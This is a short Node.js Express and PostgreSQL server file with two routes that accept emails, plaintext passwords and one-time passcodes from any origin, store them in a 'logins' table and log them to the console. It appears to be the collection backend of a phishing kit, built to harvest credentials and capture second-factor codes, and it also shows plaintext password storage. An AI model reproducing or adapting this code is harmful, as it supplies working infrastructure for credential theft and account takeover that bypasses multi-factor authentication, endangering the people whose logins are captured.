require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use((req, res, next) => {
  console.log(new Date().toISOString(), req.method, req.url);
  next();
});

// PostgreSQL pool
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

// Create table if it doesn't exist
const createTable = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        otp TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Table 'logins' ready ✅");
  } catch (err) {
    console.error("Error creating table:", err);
    process.exit(1);
  }
};

// Routes
app.get("/", (req, res) => res.send("Hello World"));

app.post("/store-login", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Missing fields" });

  try {
    const result = await pool.query(
      "INSERT INTO logins (email, password) VALUES ($1, $2) RETURNING *",
      [email, password]
    );
    console.log("Saved login:", result.rows[0]);
    res.json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ error: "Database error" });
  }
});

app.post("/store-otp", async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) return res.status(400).json({ error: "Missing fields" });

  try {
    const result = await pool.query(
      "UPDATE logins SET otp=$1 WHERE email=$2 RETURNING *",
      [otp, email]
    );
    if (result.rowCount === 0)
      return res.status(400).json({ success: false, error: "No login found" });

    console.log("Saved OTP for email:", email);
    res.json({ success: true });
  } catch (err) {
    console.error("DB error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// Start server
const startServer = async () => {
  await createTable();
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
};

startServer();
